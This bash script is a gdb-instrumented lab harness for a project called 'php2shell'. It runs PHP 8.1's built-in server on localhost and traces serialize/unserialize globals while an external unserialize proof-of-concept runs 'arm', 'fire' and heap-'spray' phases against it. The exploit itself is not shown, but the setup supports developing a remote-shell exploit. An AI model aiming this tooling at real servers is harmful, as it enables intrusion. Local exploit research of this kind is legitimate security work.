#!/bin/bash
# gdb-instrumented php2shell lab: traces BG(serialize)/BG(unserialize) level+data
# across arm and fire, plus the OOM bailout point. Args: port spray [mem] [arm_files]
set -u
PORT=${1:-18093}
SPRAY=${2:-350}
MEM=${3:-5M}
AFILES=${4:-8}
ROOT=/tmp/php2shell3
SID=u0123456789abcdefghijklmnopqrstuv
POC=/mnt/c/Users/andre/Downloads/php2shell-claude/poc_unserialize.py

pkill -f "php -S 127.0.0.1:$PORT" 2>/dev/null; sleep 0.3
rm -rf "$ROOT"; mkdir -p "$ROOT/sess"
cp /mnt/c/Users/andre/Downloads/php2shell-claude/lab_index.php "$ROOT/index.php"

# BG offsets from grok's off.c run: serialize data=3360 level=3368 (PHP 8.1.2 x86-64)
cat > "$ROOT/bg.gdb" << EOF
set pagination off
set confirm off
set debuginfod enabled off
set breakpoint pending on
break php_var_serialize_init
commands
silent
printf "SER_INIT   level=%u data=%p\n", *(unsigned int*)((char*)&basic_globals+3368), *(void**)((char*)&basic_globals+3360)
continue
end
break php_var_serialize_destroy
commands
silent
printf "SER_DESTROY level=%u data=%p\n", *(unsigned int*)((char*)&basic_globals+3368), *(void**)((char*)&basic_globals+3360)
continue
end
break php_var_unserialize_init
commands
silent
printf "UNSER_INIT  level=%u data=%p\n", *(unsigned int*)((char*)&basic_globals+3384), *(void**)((char*)&basic_globals+3376)
continue
end
break php_var_unserialize_destroy
commands
silent
printf "UNSER_DESTROY level=%u data=%p\n", *(unsigned int*)((char*)&basic_globals+3384), *(void**)((char*)&basic_globals+3376)
continue
end
set logging file $ROOT/gdbtrace.log
set logging enabled on
run -d memory_limit=$MEM -d display_errors=0 -d post_max_size=32M -d upload_max_filesize=32M -d max_file_uploads=25 -d session.upload_progress.min_freq=0 -d session.save_path=$ROOT/sess -S 127.0.0.1:$PORT -t $ROOT
EOF

gdb -q -x "$ROOT/bg.gdb" /usr/bin/php8.1 > "$ROOT/gdb.log" 2>&1 &
GDB=$!
sleep 3
curl -s -o /dev/null http://127.0.0.1:$PORT/index.php

timeout 60 python3 "$POC" "http://127.0.0.1:$PORT/index.php" --lab --sid "$SID" --skip-fire --arm-files "$AFILES" 2>&1 | grep -E 'arm |status'
rm -f "$ROOT/sess/sess_$SID"
timeout 60 python3 "$POC" "http://127.0.0.1:$PORT/index.php" --lab --sid "$SID" --fire-sid "$SID" --skip-arm --spray "$SPRAY" 2>&1 | grep -E 'fire |status'
sleep 1
kill -0 $GDB 2>/dev/null && echo "GDB/SERVER ALIVE" || echo "GDB/SERVER DEAD"
kill $GDB 2>/dev/null; pkill -f "php -S 127.0.0.1:$PORT" 2>/dev/null
sleep 0.5
echo "=== trace ==="
cat "$ROOT/gdbtrace.log" 2>/dev/null | tail -60
